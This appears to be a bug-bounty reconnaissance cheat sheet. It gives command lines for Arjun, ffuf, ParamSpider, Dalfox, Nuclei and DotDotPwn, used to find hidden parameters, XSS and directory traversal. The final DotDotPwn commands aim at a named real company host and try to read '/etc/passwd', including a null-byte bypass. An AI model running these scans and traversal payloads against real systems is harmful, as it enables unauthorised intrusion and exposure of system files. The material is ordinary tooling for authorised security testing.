<details>
  <summary>Arjun</summary>

    arjun -u "https://target.com" -m get --stable |anew arjunParam.txt
    
    arjun -i hiddenFiles.txt -t 10 -c 300 -T 30 -d 10 -oB 127.0.0.1:8080 -m POST -oT hiddenParam1.txt
    
    arjun -i allURLs.txt -t 10 -c 300 -T 30 -d 10 -oB 127.0.0.1:8080 -m POST -oT hiddenParam2.txt

</details>

--------------------------------------------------------------------------------------

ffuf -u https://target.com/page.php?FUZZ=test -w /mnt/CyberSecurity/SecLists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt |anew ffufParam.txt

cat ffufParam.txt arjunParam.txt |anew allHidenParam.txt



#### Paramspider | gau | kxss
```
python3 ParamSpider/paramspider.py -d target | kxss 
cat subdomains.txt | gau | grep "?" | kxss
```
#### parameter brute forcing 
    Arjun -u host.com -w Wordlists/Param-Miner.txt

#### Dalfox tool for scanning
    Dalfox url host.com?parameters=xss

#### Nuclei to fuzz for vulns
    nuclei -l parameters.txt -t nuclei_templates/ -et nuclei_templates/waf -et nuclei_templates/others

#### DotDotPwn --> <https://github.com/wireghoul/dotdotpwn>  --> for Directory Traversal automation
    dotdotpwn -m http-url -u "<https://attachrite.dell.com/en/images/TRAVERSAL>" -f "/???/??ss??" -k "root" -d 20 -b -e "%00.png"
    dotdotpwn -m http-url -u "<https://attachrite.dell.com/en/images/TRAVERSAL>" -f "etc/passwd" -k "root" -d 20 -b
